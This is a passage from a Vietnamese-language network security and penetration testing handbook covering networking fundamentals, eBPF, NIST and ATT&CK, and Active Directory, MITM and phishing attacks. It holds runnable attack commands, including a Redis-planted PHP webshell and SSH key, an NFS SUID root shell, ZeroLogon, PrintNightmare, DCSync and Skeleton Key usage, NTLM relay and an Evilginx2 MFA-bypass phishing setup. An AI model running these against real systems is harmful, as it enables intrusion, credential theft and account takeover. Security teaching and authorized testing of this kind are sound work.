# 3. NTP mode 6 (control) queries → info disclosure

# Phòng chống:
# Disable monlist: restrict noquery
# Use NTP authentication
# Pool: pool.ntp.org instead of single server
```

## 22.2 NFS (Network File System) - Port 2049

```bash
# NFS Enumeration
showmount -e 192.168.1.100              # List exported shares
nmap --script nfs-showmount 192.168.1.100

# Mount NFS share
mkdir /mnt/nfs
mount -t nfs 192.168.1.100:/share /mnt/nfs
mount -t nfs -o vers=3 192.168.1.100:/share /mnt/nfs

# Common misconfig: no_root_squash
# → root trên client = root trên NFS server
# Exploit: Mount share, tạo SUID binary, execute trên server

# Tạo SUID bash (nếu no_root_squash):
cp /bin/bash /mnt/nfs/rootbash
chmod +s /mnt/nfs/rootbash
# Trên server: ./rootbash -p → root shell!
```

## 22.3 Redis - Port 6379

```bash
# Redis mặc định KHÔNG CÓ authentication!
redis-cli -h 192.168.1.100

# Enum
INFO
CONFIG GET *
KEYS *
GET key_name

# Write SSH key (RCE nếu Redis chạy root)
redis-cli -h target
> CONFIG SET dir /root/.ssh/
> CONFIG SET dbfilename authorized_keys
> SET payload "\n\nssh-rsa AAAA... attacker@kali\n\n"
> SAVE

# Write webshell
> CONFIG SET dir /var/www/html/
> CONFIG SET dbfilename shell.php
> SET payload "<?php system($_GET['cmd']); ?>"
> SAVE
# Truy cập: http://target/shell.php?cmd=id
```

## 22.4 MongoDB - Port 27017

```bash
# MongoDB mặc định KHÔNG CÓ authentication!
mongo --host 192.168.1.100

# Enum
> show dbs
> use admin
> show collections
> db.users.find()
> db.users.find().pretty()

# Dump toàn bộ
mongodump --host 192.168.1.100 --out /tmp/dump

# Nmap script
nmap --script mongodb-info,mongodb-databases -p 27017 target
```

---

# PHẦN 23: eBPF & MODERN NETWORK SECURITY

## 23.1 eBPF (extended Berkeley Packet Filter)

```
eBPF là gì?
Chạy sandboxed programs trong Linux kernel KHÔNG cần modify kernel.
Dùng cho: Network monitoring, security enforcement, observability.

Use cases Security:
  - Packet filtering hiệu suất cao (thay iptables)
  - System call monitoring (detect malicious behavior)
  - Container network policy (Cilium)
  - Runtime security (Falco, Tetragon)

# === Cilium (Kubernetes CNI + Security) ===
# Network policy enforcement bằng eBPF
# Thay vì iptables rules → eBPF programs
# L3/L4 + L7 policy (HTTP, gRPC, Kafka)
# Transparent encryption (WireGuard)

# === Falco (Runtime Security) ===
# Detect suspicious behavior dựa trên syscall monitoring
# Rules ví dụ:
# - Phát hiện shell spawn trong container
# - Phát hiện sensitive file read (/etc/shadow)
# - Phát hiện outbound connection bất thường

# === Tetragon (Cilium) ===
# eBPF-based security observability
# Enforce policies tại kernel level
# Detect + prevent file/network/process events

# === bpftrace (Tracing tool) ===
# Trace network events
bpftrace -e 'tracepoint:net:netif_rx { printf("%s\n", comm); }'
bpftrace -e 'kprobe:tcp_connect { printf("TCP connect: %s\n", comm); }'
```

---

# PHẦN 24: NETWORK SECURITY FRAMEWORKS & COMPLIANCE

## 24.1 NIST Cybersecurity Framework

```
5 Core Functions:
  1. Identify   → Asset management, risk assessment
  2. Protect    → Access control, awareness, data security
  3. Detect     → Anomalies, continuous monitoring, detection processes
  4. Respond    → Response planning, communications, analysis
  5. Recover    → Recovery planning, improvements

Network Security Controls (NIST 800-53):
  AC (Access Control)
  AU (Audit and Accountability)
  CA (Security Assessment)
  SC (System and Communications Protection)
  SI (System and Information Integrity)
```

## 24.2 MITRE ATT&CK - Network Techniques

```
Reconnaissance:
  T1595 - Active Scanning
  T1590 - Gather Victim Network Information
  T1596 - Search Open Technical Databases

Initial Access:
  T1133 - External Remote Services
  T1190 - Exploit Public-Facing Application

Lateral Movement:
  T1021 - Remote Services (SSH, RDP, SMB, WinRM)
  T1080 - Taint Shared Content
  T1563 - Remote Service Session Hijacking

Command and Control:
  T1071 - Application Layer Protocol (HTTP, DNS, SMTP)
  T1572 - Protocol Tunneling
  T1573 - Encrypted Channel
  T1090 - Proxy
  T1095 - Non-Application Layer Protocol (ICMP)

Exfiltration:
  T1048 - Exfiltration Over Alternative Protocol
  T1041 - Exfiltration Over C2 Channel
  T1567 - Exfiltration Over Web Service

# Dùng ATT&CK để:
# 1. Map coverage: Kiểm tra detection rules cover technique nào
# 2. Gap analysis: Technique nào chưa có detection
# 3. Threat modeling: Threat actor dùng technique nào
# 4. Purple team: Red team tấn công theo ATT&CK, blue team detect
```

# PHẦN 25: FUNDAMENTALS BỔ SUNG

## 25.1 Subnetting Nâng cao

### CIDR (Classless Inter-Domain Routing)

```
Trước CIDR (Classful):
  Class A: /8  (16 triệu hosts) — quá lớn
  Class B: /16 (65,534 hosts) — thường quá lớn
  Class C: /24 (254 hosts) — thường quá nhỏ
  → Lãng phí IP address khủng khiếp

CIDR cho phép prefix BẤT KỲ: /17, /19, /21, /27, /30, v.v.

Bảng tham khảo nhanh:
┌────────┬─────────────────────┬──────────┬────────────┐
│ CIDR   │ Subnet Mask         │ Addresses│ Usable     │
├────────┼─────────────────────┼──────────┼────────────┤
│ /32    │ 255.255.255.255     │ 1        │ 1 (host)   │
│ /31    │ 255.255.255.254     │ 2        │ 2 (P2P)    │
│ /30    │ 255.255.255.252     │ 4        │ 2          │
│ /29    │ 255.255.255.248     │ 8        │ 6          │
│ /28    │ 255.255.255.240     │ 16       │ 14         │
│ /27    │ 255.255.255.224     │ 32       │ 30         │
│ /26    │ 255.255.255.192     │ 64       │ 62         │
│ /25    │ 255.255.255.128     │ 128      │ 126        │
│ /24    │ 255.255.255.0       │ 256      │ 254        │
│ /23    │ 255.255.254.0       │ 512      │ 510        │
│ /22    │ 255.255.252.0       │ 1,024    │ 1,022      │
│ /21    │ 255.255.248.0       │ 2,048    │ 2,046      │
│ /20    │ 255.255.240.0       │ 4,096    │ 4,094      │
│ /19    │ 255.255.224.0       │ 8,192    │ 8,190      │
│ /18    │ 255.255.192.0       │ 16,384   │ 16,382     │
│ /17    │ 255.255.128.0       │ 32,768   │ 32,766     │
│ /16    │ 255.255.0.0         │ 65,536   │ 65,534     │
└────────┴─────────────────────┴──────────┴────────────┘

Magic Number Method (tính nhanh):
  Mask octet value → Magic = 256 - mask value
  Ví dụ: /27 → mask = 255.255.255.224
  Magic = 256 - 224 = 32
  Subnets: 0, 32, 64, 96, 128, 160, 192, 224

  IP: 172.16.45.200 /27
  Magic = 32
  Network = 172.16.45.192 (200 ÷ 32 = 6.25, floor = 6, 6×32 = 192)
  Broadcast = 172.16.45.223 (192 + 32 - 1)
  First host = 172.16.45.193
  Last host = 172.16.45.222
```

### VLSM (Variable Length Subnet Masking)

```
VLSM cho phép dùng NHIỀU subnet mask khác nhau trong cùng 1 network.
→ Tối ưu sử dụng IP address.

Ví dụ: Được cấp 192.168.1.0/24, cần chia cho:
  - LAN A: 100 hosts
  - LAN B: 50 hosts
  - LAN C: 25 hosts
  - WAN link 1: 2 hosts
  - WAN link 2: 2 hosts

Giải (luôn chia subnet LỚN trước):
  LAN A (100): /25 → 126 hosts → 192.168.1.0/25
  LAN B (50):  /26 → 62 hosts  → 192.168.1.128/26
  LAN C (25):  /27 → 30 hosts  → 192.168.1.192/27
  WAN 1 (2):   /30 → 2 hosts   → 192.168.1.224/30
  WAN 2 (2):   /30 → 2 hosts   → 192.168.1.228/30
  Còn lại: 192.168.1.232 - 192.168.1.255 (dự phòng)
```

### Route Summarization (Supernetting)

```
Gộp nhiều network nhỏ → 1 route lớn hơn.
Giảm bảng routing, tăng hiệu suất.

Ví dụ: Gộp 4 mạng /24:
  192.168.0.0/24
  192.168.1.0/24
  192.168.2.0/24
  192.168.3.0/24

  Binary octet 3:
  0 = 00000000
  1 = 00000001
  2 = 00000010
  3 = 00000011
  Common bits: 000000 (6 bits giống) → /22

  Summary route: 192.168.0.0/22
```

## 25.2 Encapsulation / Decapsulation

```
Khi data đi XUỐNG từ Application → Physical, mỗi tầng THÊM header:

Application  : DATA                              (PDU: Data)
Transport    : [TCP Header] + DATA               (PDU: Segment)
Network      : [IP Header] + [TCP] + DATA        (PDU: Packet)
Data Link    : [ETH Header] + [IP] + [TCP] + DATA + [FCS]  (PDU: Frame)
Physical     : 01010110110...                     (PDU: Bits)

Khi đến máy đích, ngược lại: mỗi tầng BỎ header của mình (decapsulation).

Quy trình chi tiết khi bạn truy cập http://example.com:

1. Application: Tạo HTTP GET request
2. Transport: Đóng gói vào TCP segment
   - Source port: random high (ví dụ 54321)
   - Dest port: 80
   - Sequence number, flags (SYN lần đầu)
3. Network: Đóng gói vào IP packet
   - Source IP: 192.168.1.100
   - Dest IP: 93.184.216.34 (đã resolve DNS trước đó)
   - TTL: 64
4. Data Link: Đóng gói vào Ethernet frame
   - Source MAC: MAC card mạng bạn
   - Dest MAC: MAC gateway (KHÔNG phải MAC server!)
   - ↑ Vì server ở mạng khác, phải gửi cho gateway trước
5. Physical: Chuyển thành tín hiệu điện/quang truyền qua cáp

Tại mỗi router trên đường đi:
  - Bỏ frame header (Layer 2) cũ
  - Đọc IP header → tìm next hop trong routing table
  - Đóng frame header (Layer 2) MỚI (MAC router → MAC next hop)
  - IP header KHÔNG đổi (trừ TTL giảm 1)
```

## 25.3 TCP Internals Chi tiết

### Sliding Window & Flow Control

```
TCP Window Size: Số bytes receiver SẴN SÀNG nhận trước khi cần ACK.

Ví dụ Window Size = 3000 bytes:
  Sender gửi 1000 bytes → còn 2000 bytes
  Sender gửi 1000 bytes → còn 1000 bytes
  Sender gửi 1000 bytes → window full, PHẢI chờ ACK
  Receiver ACK → window mở lại

Window Scaling (Option trong SYN):
  Window size field = 16 bit → max 65,535 bytes
  Không đủ cho mạng nhanh → Window Scale factor
  Ví dụ: Scale = 7 → Actual window = 65535 × 2^7 = 8,388,480 bytes

Zero Window:
  Receiver gửi Window = 0 → "Đừng gửi nữa, tôi đang xử lý"
  Sender gửi Window Probe định kỳ → chờ window mở lại
```

### TCP Congestion Control

```
Tránh gửi quá nhanh làm nghẽn mạng:

1. Slow Start:
   cwnd (congestion window) = 1 MSS
   Mỗi ACK: cwnd × 2 (tăng exponential)
   1 → 2 → 4 → 8 → 16 → ... cho đến ssthresh

2. Congestion Avoidance:
   Khi cwnd ≥ ssthresh: tăng LINEAR (cwnd + 1 mỗi RTT)

3. Khi mất packet (congestion):
   TCP Tahoe: cwnd = 1, slow start lại
   TCP Reno: cwnd = cwnd/2, congestion avoidance (fast recovery)
   TCP CUBIC: Modern Linux default, function bậc 3

Biểu đồ:
  cwnd
   │        /\
   │       /  \      /‾‾‾‾‾
   │      /    \    /
   │     /      \  /
   │    /        \/  ← packet loss
   │   /
   │  /  ← slow start
   │ /
   └──────────────────── time
```

### MTU & Fragmentation

```
MTU (Maximum Transmission Unit):
  Ethernet MTU = 1500 bytes (payload tối đa của 1 frame)
  IP header = 20 bytes, TCP header = 20 bytes
  → MSS (Maximum Segment Size) = 1500 - 20 - 20 = 1460 bytes

Fragmentation:
  Khi packet > MTU của link tiếp theo → router chia nhỏ packet
  IP header flags: DF (Don't Fragment), MF (More Fragments)
  Fragment Offset: Vị trí fragment trong packet gốc

Path MTU Discovery:
  Gửi packet với DF flag set
  Nếu packet > MTU → router trả ICMP "Fragmentation Needed"
  → Sender giảm size → thử lại
  → Tìm ra MTU nhỏ nhất trên đường đi

# Test MTU
ping -M do -s 1472 192.168.1.1     # Linux (DF set, 1472 + 28 = 1500)
ping -f -l 1472 192.168.1.1        # Windows

# Security: Fragmentation dùng để evade IDS/firewall
# Tiny fragment attack: Fragment nhỏ đến mức TCP header bị chia
# → IDS không thấy port number → bypass rule
```

## 25.4 IPv6 Chi tiết

```
=== Address Types ===
Global Unicast:    2000::/3  (tương đương public IPv4)
Link-Local:        fe80::/10 (tự động, chỉ trong LAN)
Unique Local:      fc00::/7  (tương đương private IPv4)
Multicast:         ff00::/8  (thay broadcast)
Loopback:          ::1/128

=== SLAAC (Stateless Address Autoconfiguration) ===
Host tự tạo IPv6 address KHÔNG cần DHCP:
1. Tạo Link-Local address: fe80:: + EUI-64 (từ MAC address)
2. DAD (Duplicate Address Detection): Gửi Neighbor Solicitation cho address vừa tạo
   → Nếu không ai reply → address unique
3. Router Solicitation → Router Advertisement
   → Nhận prefix (ví dụ 2001:db8:1::/64)
4. Tạo Global Unicast: prefix + EUI-64 (hoặc random - privacy extension)

EUI-64 (từ MAC address):
  MAC: AA:BB:CC:DD:EE:FF
  → Insert FFFE: AA:BB:CC:FF:FE:DD:EE:FF
  → Flip 7th bit: A8:BB:CC:FF:FE:DD:EE:FF
  → IPv6: fe80::a8bb:ccff:fedd:eeff

=== NDP (Neighbor Discovery Protocol) - Thay ARP ===
  Router Solicitation (RS):   Host hỏi "Router ở đâu?"
  Router Advertisement (RA):  Router trả lời prefix, gateway
  Neighbor Solicitation (NS): Tương đương ARP Request
  Neighbor Advertisement (NA): Tương đương ARP Reply
  Redirect:                   Router chỉ đường tốt hơn

=== DHCPv6 ===
  Stateful:  Cấp IP + DNS + domain (giống DHCPv4)
  Stateless: Chỉ cấp DNS + domain (IP do SLAAC tạo)

=== Transition Mechanisms ===
  Dual Stack: Chạy cả IPv4 và IPv6 song song
  Tunneling:  Đóng gói IPv6 trong IPv4 (6to4, Teredo, ISATAP)
  NAT64:      Translate IPv6 ↔ IPv4

=== IPv6 Security ===
  NDP Spoofing = ARP Spoofing phiên bản IPv6
  Router Advertisement flood
  DHCPv6 starvation
  Nhiều firewall chỉ filter IPv4, bỏ qua IPv6 → attack surface
  Privacy extensions: Random interface ID thay EUI-64 (chống tracking)
```

## 25.5 Switching Concepts Bổ sung

```
=== Port Mirroring / SPAN ===
Copy traffic từ 1 hoặc nhiều port → 1 monitoring port
Dùng cho: IDS, packet analysis, troubleshooting

Cisco:
  (config)# monitor session 1 source interface gi0/1
  (config)# monitor session 1 destination interface gi0/24

RSPAN: SPAN qua VLAN (remote switch)
ERSPAN: SPAN qua IP (encapsulate in GRE)

=== EtherChannel / LACP ===
Gộp nhiều link vật lý → 1 link logic (tăng bandwidth + redundancy)

LACP (Link Aggregation Control Protocol - 802.3ad):
  Dynamic negotiation
  Active/Passive mode

PAgP (Port Aggregation Protocol - Cisco proprietary)

Cisco:
  (config)# interface range gi0/1-2
  (config-if-range)# channel-group 1 mode active    # LACP

=== PoE (Power over Ethernet) ===
Cung cấp điện qua cáp Ethernet (cho IP phone, AP, camera)
  802.3af: 15.4W per port
  802.3at (PoE+): 25.5W
  802.3bt (PoE++): 60-100W

=== LLDP / CDP ===
LLDP (Link Layer Discovery Protocol): Standard, mọi vendor
CDP (Cisco Discovery Protocol): Cisco only

Gửi thông tin: Hostname, IP, Platform, Version, VLAN, PoE
→ Dùng cho: Network topology discovery
→ Security: Tắt trên edge port (lộ thông tin cho attacker)

# Xem LLDP neighbors
lldpctl                          # Linux
show lldp neighbors              # Cisco

# CDP
show cdp neighbors detail        # Cisco
```

## 25.6 Giao thức bổ sung

### GRE (Generic Routing Encapsulation)

```
Đóng gói bất kỳ protocol nào trong IP tunnel
Dùng cho: VPN site-to-site, tunnel giữa routers

Original packet: [IP Header][Payload]
GRE:            [New IP Header][GRE Header][Original IP][Payload]

# Linux GRE tunnel
ip tunnel add gre1 mode gre remote 203.0.113.1 local 198.51.100.1
ip addr add 10.0.0.1/30 dev gre1
ip link set gre1 up

Không mã hóa! Chỉ encapsulate. Thường kết hợp với IPsec.
```

### PPP / PPPoE

```
PPP (Point-to-Point Protocol):
  Layer 2, dùng cho kết nối point-to-point (serial, dial-up)
  Phases: Link establishment → Authentication → Network configuration
  Auth methods: PAP (plaintext!), CHAP (challenge-response), EAP

PPPoE (PPP over Ethernet):
  Đóng gói PPP trong Ethernet frames
  Phổ biến cho DSL Internet (ADSL, VDSL)
  Adds 8 bytes overhead → MTU giảm từ 1500 → 1492

L2TP (Layer 2 Tunneling Protocol):
  Kết hợp PPTP + L2F
  Không mã hóa → thường dùng với IPsec (L2TP/IPsec)
  Port: UDP 1701
```

### IGMP (Internet Group Management Protocol)

```
Quản lý multicast group membership
Host join/leave multicast group → router biết forward multicast traffic cho ai

Types:
  Membership Query: Router hỏi "Ai muốn nhận multicast?"
  Membership Report: Host trả lời "Tôi muốn nhận group 224.x.x.x"
  Leave Group: Host rời group

IGMP Snooping:
  Switch kiểm tra IGMP messages → chỉ forward multicast đến port cần thiết
  (thay vì flood tất cả port)
```

## 25.7 QoS (Quality of Service)

```
Ưu tiên traffic quan trọng (voice, video) hơn traffic thường (email, web).

Mechanisms:
  Classification: Phân loại traffic (DSCP, CoS, ACL)
  Marking: Đánh dấu packet (DSCP value trong IP header)
  Queuing: Xếp hàng ưu tiên (LLQ, WFQ, CBWFQ)
  Policing: Drop traffic vượt rate limit
  Shaping: Buffer traffic vượt limit (gửi sau thay vì drop)

DSCP (Differentiated Services Code Point):
  6 bits trong IP header TOS field
  EF (Expedited Forwarding) = 46: Voice (highest priority)
  AF (Assured Forwarding): 4 classes × 3 drop precedence
  CS (Class Selector): Backward compatible with IP Precedence
  BE (Best Effort) = 0: Default

802.1p / CoS (Class of Service):
  3 bits trong 802.1Q VLAN tag
  0 = Best Effort, 5 = Voice, 7 = Network Control
```

## 25.8 Troubleshooting Methodology

```
=== OSI-Based Approach ===

Bottom-Up (Physical → Application):
  1. Check cables, link lights
  2. Check MAC, switch port, VLAN
  3. Check IP, subnet, gateway, routing
  4. Check port, firewall rules
  5. Check DNS, application config
  Best for: hardware/connectivity issues

Top-Down (Application → Physical):
  1. Check application logs, service running
  2. Check DNS resolution
  3. Check firewall, ports open
  4. Check IP connectivity (ping gateway, ping remote)
  5. Check physical (cable, interface up)
  Best for: application/service issues

Divide-and-Conquer:
  Start at Layer 3 (ping)
  → Works → problem is above (L4-L7)
  → Fails → problem is below (L1-L2)
  Best for: faster isolation

=== Common Commands per Layer ===
L1: check link lights, cable tester, show interface status
L2: show mac address-table, show vlan, arp -a
L3: ping, traceroute, show ip route, ip addr
L4: ss -tlnp, netstat -an, telnet host port
L7: curl, nslookup, dig, application logs
```

## 25.9 Tools Bổ sung

```bash
# === mtr (My Traceroute) - Kết hợp ping + traceroute ===
mtr 8.8.8.8                      # Realtime, continuous
mtr -r -c 100 8.8.8.8            # Report mode (100 cycles)
# Hiển thị: mỗi hop + loss% + latency → tìm bottleneck

# === pathping (Windows - tương tự mtr) ===
pathping 8.8.8.8

# === hping3 - Packet crafting CLI ===
# TCP SYN scan
hping3 -S -p 80 192.168.1.100

# TCP flood (rate limited)
hping3 -S --flood -p 80 192.168.1.100

# Custom flags
hping3 -F -S -R -p 80 192.168.1.100    # FIN+SYN+RST

# ICMP with custom data
hping3 -1 -d 120 192.168.1.100

# Traceroute mode
hping3 --traceroute -S -p 443 8.8.8.8

# === nbtstat (Windows - NetBIOS info) ===
nbtstat -a 192.168.1.100         # Remote NetBIOS name table
nbtstat -n                       # Local NetBIOS names
nbtstat -c                       # NetBIOS cache

# === arp command ===
arp -a                           # Show ARP table
arp -d 192.168.1.100             # Delete ARP entry
arp -s 192.168.1.100 AA:BB:CC:DD:EE:FF   # Static entry

# === DNS tools bổ sung ===
# CAA record (Certificate Authority Authorization)
dig target.com CAA
# Chỉ định CA nào được phép issue certificate cho domain

# SOA record chi tiết
dig target.com SOA
# MNAME: Primary nameserver
# RNAME: Admin email (@ thay bằng .)
# Serial: Version number (tăng mỗi khi update)
# Refresh: Secondary check primary interval
# Retry: Retry interval nếu refresh fail
# Expire: Secondary ngừng serve nếu không refresh được
# Minimum TTL: Negative caching TTL
```

---

# PHẦN 26: AD ATTACKS TOÀN TẬP

> **CẢNH BÁO**: Các kỹ thuật AD attack CHỈ sử dụng trong authorized pentest hoặc lab. Tấn công Active Directory trái phép = vi phạm nghiêm trọng.

## 26.1 Domain Enumeration Nâng cao

```bash
# === BloodHound (AD Attack Path Visualization) ===
# Thu thập data
bloodhound-python -u user -p 'password' -d target.com -c All -ns 192.168.1.1
# Hoặc SharpHound trên Windows
.\SharpHound.exe -c All

# Import vào BloodHound → Visualize attack paths
# Queries quan trọng:
# - Shortest path to Domain Admin
# - Find Kerberoastable accounts
# - Find AS-REP roastable accounts
# - Users with DCSync rights
# - Unconstrained delegation computers
```

## 26.2 Credential Attacks Nâng cao

### Password Attack Taxonomy

```
┌─────────────────────────────────────────────────────────┐
│                    Password Attacks                      │
├──────────────────┬──────────────────┬───────────────────┤
│ Brute Force      │ Password Spray   │ Credential Stuff  │
├──────────────────┼──────────────────┼───────────────────┤
│ 1 user,          │ 1 password,      │ Known user:pass   │
│ many passwords   │ many users       │ pairs from leaks  │
│                  │                  │                   │
│ High lockout risk│ Low lockout risk │ Uses breach data  │
│ Slow per user    │ Across many users│ Very effective     │
│                  │                  │ (password reuse)  │
│ hydra, medusa    │ crackmapexec     │ Custom scripts    │
│                  │ spray.sh         │                   │
└──────────────────┴──────────────────┴───────────────────┘

Online: Against live service (rate limited, lockout risk)
Offline: Against captured hash (GPU, unlimited speed)
```

### Hashcat Mode Cheat Sheet

```
Mode    Hash Type                    Example
─────   ──────────────────────────   ─────────────────
0       MD5                          5d41402abc4b2a76...
100     SHA1                         aaf4c61ddcc5e8a2...
1000    NTLM                        aad3b435b514...
1800    sha512crypt (Linux)          $6$rounds$salt$hash
3200    bcrypt                       $2a$12$salt...hash
5600    NetNTLMv2                    user::domain:chall:hash
7500    Kerberos 5 AS-REQ (RC4)
13100   Kerberos 5 TGS-REP (RC4)    Kerberoasting
18200   Kerberos 5 AS-REP (RC4)     AS-REP Roasting
22000   WPA-PBKDF2-PMKID+EAPOL      WiFi
```

## 26.3 Critical AD Vulnerabilities

```bash
# === ZeroLogon (CVE-2020-1472) ===
# Nguyên lý: Flaw trong Netlogon protocol (AES-CFB8)
# → Set DC machine account password = empty → DCSync
zerologon_tester.py DC01 192.168.1.1
cve-2020-1472-exploit.py DC01 192.168.1.1
secretsdump.py -no-pass -just-dc target.com/DC01\$@192.168.1.1

# === PrintNightmare ===
# CVE-2021-1675 (LPE) + CVE-2021-34527 (RCE)
# Nguyên lý: Print Spooler service cho phép load DLL qua SMB share → SYSTEM shell
# CVE-2021-1675.py = LPE exploit, CVE-2021-34527 = RCE variant
CVE-2021-1675.py target.com/user:password@192.168.1.1 '\\attacker\share\evil.dll'

# === PetitPotam (MS-EFSRPC) ===
# Nguyên lý: Coerce DC authentication → relay to ADCS → get DC cert → DCSync
# Bước 1: Start relay
ntlmrelayx.py -t http://ca-server/certsrv/certfnsh.asp -smb2support --adcs
# Bước 2: Coerce auth
PetitPotam.py attacker-ip dc-ip
# Bước 3: Use cert for auth
certipy auth -pfx dc.pfx -dc-ip 192.168.1.1

# === noPac (CVE-2021-42287/42278) ===
# Nguyên lý: Create machine account → rename to DC → request TGT → rename back → get TGS as DC
noPac.py target.com/user:password -dc-ip 192.168.1.1 --impersonate Administrator -dump

# === DCSync ===
# Nguyên lý: User với Replicating Directory Changes rights
# → Giả làm DC, request password replication
secretsdump.py target.com/admin:password@192.168.1.1 -just-dc-ntlm

# Mimikatz:
mimikatz> lsadump::dcsync /user:krbtgt /domain:target.com

# === DCShadow ===
# Nguyên lý: Register rogue DC → push malicious changes → replicate
# → Stealth persistence (changes appear legitimate)
mimikatz> lsadump::dcshadow /object:targetuser /attribute:primaryGroupID /value:512

# === Skeleton Key ===
# Nguyên lý: Patch LSASS trên DC → accept "master password" cho mọi user
# Password gốc vẫn hoạt động → khó phát hiện
mimikatz> misc::skeleton
# Giờ login bất kỳ user nào với password "mimikatz"

# === AdminSDHolder Abuse ===
# Nguyên lý: AdminSDHolder object propagates ACL cho privileged groups mỗi 60 phút
# → Thêm ACE cho attacker vào AdminSDHolder → persistence
# → Dù admin xóa quyền, 60 phút sau sẽ được restore

# === GPO Abuse ===
# Nếu có write access vào GPO linked to OU chứa target:
# → Add scheduled task, startup script, hoặc security settings
# Tools: SharpGPOAbuse, pyGPOAbuse

SharpGPOAbuse.exe --AddLocalAdmin --UserAccount attacker --GPOName "Default Domain Policy"

# === LAPS (Local Administrator Password Solution) ===
# LAPS lưu local admin password trong AD attribute
# Nếu có read access:
Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd | Select Name, ms-Mcs-AdmPwd
# Hoặc
crackmapexec ldap dc-ip -u user -p pass -M laps

# === Shadow Credentials ===
# Nguyên lý: Modify msDS-KeyCredentialLink attribute → add attacker's key
# → Authenticate as target without knowing password
pywhisker.py -d target.com -u user -p pass --target victim --action add
certipy auth -pfx victim.pfx -dc-ip 192.168.1.1

# === DPAPI Secrets ===
# DPAPI protects: Chrome passwords, RDP credentials, WiFi passwords, Credential Manager
# Decrypt with domain backup key:
secretsdump.py target.com/admin:pass@dc-ip -just-dc-ntlm
dpapi.py backupkeys -t target.com/admin:pass@dc-ip
```

## 26.4 NTLM Relay Paths Chi tiết

```
NTLM Relay: Chuyển tiếp NTLM authentication từ victim → target service

┌────────┐ NTLM Auth    ┌──────────┐ Forward NTLM   ┌────────┐
│ Victim │ ────────────> │ Attacker │ ──────────────> │ Target │
│(DC/Srv)│               │(Relay)   │                 │(LDAP/  │
│        │               │          │ <────────────── │ SMB/   │
│        │               │          │ Auth success!   │ ADCS)  │
└────────┘               └──────────┘                 └────────┘

Step 1: Coerce victim to authenticate (PetitPotam, PrinterBug, etc.)
Step 2: Victim sends NTLM Type 1 (Negotiate) → Attacker
Step 3: Attacker forwards Type 1 → Target
Step 4: Target sends Type 2 (Challenge) → Attacker
Step 5: Attacker forwards Type 2 → Victim
Step 6: Victim sends Type 3 (Auth with challenge response) → Attacker
Step 7: Attacker forwards Type 3 → Target
Step 8: Target authenticates → Attacker has SESSION as victim!

Source → Target    What you get
───────────────    ──────────────────────────
SMB → SMB          Shell (nếu target admin + SMB signing off)
SMB → LDAP         Modify AD objects (ACL, group membership)
SMB → LDAPS        Same + TLS
SMB → HTTP (ADCS)  Request certificate → authenticate as victim
HTTP → SMB         Shell
HTTP → LDAP        Modify AD objects
WebDAV → LDAP      Coerce auth từ workstation (không cần SMB signing bypass)

# Kiểm tra SMB Signing
crackmapexec smb 192.168.1.0/24 --gen-relay-list nosigning.txt

# WebDAV relay (không yêu cầu SMB signing disabled!)
# Vì WebDAV gửi NTLM qua HTTP, không phải SMB
ntlmrelayx.py -t ldap://dc-ip --delegate-access
# Trigger:
# Tạo file .searchConnector-ms hoặc .url trên share accessible
```

---

# PHẦN 27: ADVANCED ATTACK TECHNIQUES

> **CẢNH BÁO**: Các kỹ thuật nâng cao này CHỈ dùng trong authorized pentest, CTF, hoặc lab. Nhiều kỹ thuật ở đây bypass security controls → sử dụng trái phép = vi phạm pháp luật.

## 27.1 MITM Nâng cao

### mitm6 (IPv6 MITM)

```bash
# Nguyên lý: Windows prefer IPv6 over IPv4
# mitm6 giả làm DHCPv6 server → cung cấp DNS IPv6 = attacker
# → Victim gửi DNS queries cho attacker → NTLM auth relay

# Bước 1: Start mitm6
sudo mitm6 -d target.com

# Bước 2: Start relay (kết hợp ntlmrelayx)
ntlmrelayx.py -6 -t ldaps://dc-ip --delegate-access

# → Khi victim reboot/renew DHCP → auto-authenticate → relay → profit
```

### WPAD Poisoning

```bash
# Nguyên lý: Windows tự tìm proxy qua WPAD (Web Proxy Auto-Discovery)
# Tìm theo: DHCP option 252 → DNS (wpad.domain.com) → LLMNR/NBT-NS broadcast

# Responder tự động respond WPAD requests
sudo responder -I eth0 -wrf
# -w: WPAD proxy
# Victim browser tự configure proxy = attacker → capture all HTTP traffic + creds
```

### LLMNR vs mDNS vs NBT-NS

```
3 protocols fallback khi DNS thất bại:

LLMNR (Link-Local Multicast Name Resolution):
  Multicast 224.0.0.252, port UDP 5355
  Windows Vista+ default enabled
  Scope: Local subnet

NBT-NS (NetBIOS Name Service):
  Broadcast, port UDP 137
  Legacy Windows
  Scope: Local subnet

mDNS (Multicast DNS):
  Multicast 224.0.0.251, port UDP 5353
  macOS/Linux (Bonjour/Avahi), Windows 10+
  Scope: Local subnet, .local domain

Tất cả KHÔNG có authentication → Responder poisoning hoạt động cho cả 3

# Phòng chống:
# Disable LLMNR: GPO → Computer Config → Admin Templates → DNS Client → Turn Off Multicast Name Resolution
# Disable NBT-NS: Network adapter → WINS tab → Disable NetBIOS over TCP/IP
# Tốt nhất: Deploy DNS đúng cách để không cần fallback
```

## 27.2 Wireless Attacks Nâng cao

### WPA3 / Dragonblood

```
WPA3 dùng SAE (Simultaneous Authentication of Equals):
  Dragonfly handshake thay 4-way handshake
  → Resistant to offline dictionary attacks
  → Forward secrecy

Dragonblood attacks (CVE-2019-9494/9495/9496):
  1. Side-channel (timing/cache): Leak thông tin về password
  2. Downgrade: Force WPA2 transition mode → attack WPA2 handshake
  3. Denial of Service: Forge SAE commit messages

# Test:
dragondrain: DoS tool cho WPA3-SAE
dragonslayer: Downgrade attack
dragontime: Timing attack
dragonforce: Offline dictionary (sau side-channel)
```

### KARMA Attack

```
Nguyên lý: Device broadcast probe request cho known networks
KARMA AP respond: "Yes, I am ALL of those networks!"
→ Device auto-connect → MITM

# Dùng hostapd-mana
hostapd-mana /etc/hostapd-mana/hostapd-mana.conf

# hoặc Wifi-Pumpkin3
```

### 802.11w / PMF (Protected Management Frames)

```
802.11w protects: Deauth, Disassociation, Action frames
→ Attacker KHÔNG THỂ gửi deauth giả nếu PMF required

Bypass:
  Nếu PMF optional (capable but not required):
  → Force downgrade → deauth vẫn hoạt động
  Authentication/Association flood (không protected bởi PMF)
```

## 27.3 Phishing Network Attacks

### Evilginx2 (Adversary-in-the-Middle Phishing)

```bash
# Nguyên lý: Reverse proxy giữa victim và real site
# Capture credentials + session cookies (bypass MFA!)

# Cài đặt
go install github.com/kgretzky/evilginx2@latest

# Cấu hình
evilginx2
: config domain attacker.com
: config ip VPS_IP
: phishlets hostname o365 login.attacker.com
: phishlets enable o365
: lures create o365
: lures get-url 0
# → Gửi URL cho victim
